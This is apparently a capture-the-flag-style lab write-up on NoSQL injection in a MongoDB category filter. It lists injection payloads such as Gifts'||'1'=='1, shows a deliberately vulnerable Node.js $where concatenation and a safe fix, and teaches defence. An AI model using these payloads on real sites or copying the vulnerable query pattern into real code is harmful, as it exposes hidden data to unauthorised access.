## Lab Information
Topic: NoSQL Injection
Difficulty: Apprentice

## Lab Description (Summary of the vulnerable application and the scenario presented in the lab.)
This lab’s product category filter uses MongoDB to fetch products by category. The application directly embeds user input from the `category` parameter into a MongoDB query without proper sanitization. As a result, an attacker can inject NoSQL expressions that alter the query logic and reveal unreleased products.

## Vulnerability Analysis (Explanation of the vulnerability type and how it manifests in this specific lab.)
The vulnerability stems from unsafely inserting user-controlled input into a MongoDB query. Injected logical expressions such as `'1'=='1'` cause the query predicate to always evaluate to true. This returns all database entries, including unreleased products.

## Exploitation Steps
1. Identify `/filter?category=` as the injection point.
2. Test payloads to check for logical injection (by sending `/filter?category=Gifts'` or `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`).
3. Send GET request `/filter?category=Gifts'||'1'%3D%3D'1` which is URL-encoded `/filter?category=Gifts'||'1'=='1`. It turns to `this.category == 'Gifts'||'1'=='1'` in the code.
4. Backend evaluates the injected logic and returns unreleased products.

## Useful Payloads
```sql
-- Payload 1: vulnerability detection
category='
category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00

-- Payload 2: vulnerability exploitation (any expression equals true)
category=Gifts'||1||'
category=Gifts'||'1'=='1
```

## AppSec Perspective
### What the underlying code might be

**For MongoDB**

A very likely vulnerable implementation (Node.js + Express + MongoDB) would look like this:

```jsx
// Example: Node.js + Express + native MongoDB driver
app.get('/product/lookup', async (req, res) => {
  const category = req.query.category;             // "Gifts'||'1'=='1"

  // VULNERABLE: untrusted input concatenated into $where JavaScript
  const query = {
    $where: "this.category == '" + category + "'"  // <-- injection sink
  };

  try {
    const products = await db.collection('products')
                             .find(query)
                             .toArray();

    res.json(products);
  } catch (err) {
    console.error(err);
    res.status(500).send('Server error');
  }
});
```

What Mongo actually evaluates for your payload:

```jsx
category = "Gifts'||'1'=='1";

$where = "this.category == '" + category + "'";
// becomes:
$where = "this.category == 'fizzy'||'1'=='1'";
```

So `$where` contains:

```jsx
this.category == 'Gifts' || '1' == '1'
```

In JavaScript / MongoDB:

- `this.category == 'Gifts'` may be true or false
- `'1' == '1'` is always **true**

So the whole condition is always **true**, meaning MongoDB returns **all products** in the collection. If the collection contains “unreleased” products, they are now included too.

**For Mongoose**

If it was using Mongoose, it could look like:

```jsx
// models/Product.js
const ProductSchema = new mongoose.Schema({
  name: String,
  category: String,
  released: Boolean
});
const Product = mongoose.model('Product', ProductSchema);

// route
app.get('/product/lookup', async (req, res) => {
  const category = req.query.category;

  // VULNERABLE $where usage
  const products = await Product.find({
    $where: "this.category == '" + category + "'"
  });

  res.json(products);
});
```

### Security issues enabling exploitation
- Direct use of untrusted user input in database queries, without sanitization or structural validation.
- Lack of strict type enforcement, allowing attacker-controlled objects or expressions to be interpreted as query logic (user input influences the query structure instead of being treated as literal data).

### Safe version
No `$where`, no string concatenation, just field equality:

```jsx
app.get('/product/lookup', async (req, res) => {
  const category = req.query.category;

    try {
      // Safe: no JavaScript execution, no concatenation
      const products = await db.collection('products')
                               .find({ category: category, released: true })
                               .toArray();
    
      res.json(products);
    } catch (err) {
    console.error(err);
    res.status(500).send('Server error');
  }
});
```

## Key Takeaways
### Lessons from attacker perspective
- Logic-based NoSQLi can be performed without special operators.
- Payloads using simple boolean conditions quickly confirm vulnerability.
### Lessons from AppSec perspective (defender)
- Sanitize and validate user input, using an allowlist of accepted characters.
- Insert user input using parameterized queries instead of concatenating user input directly into the query.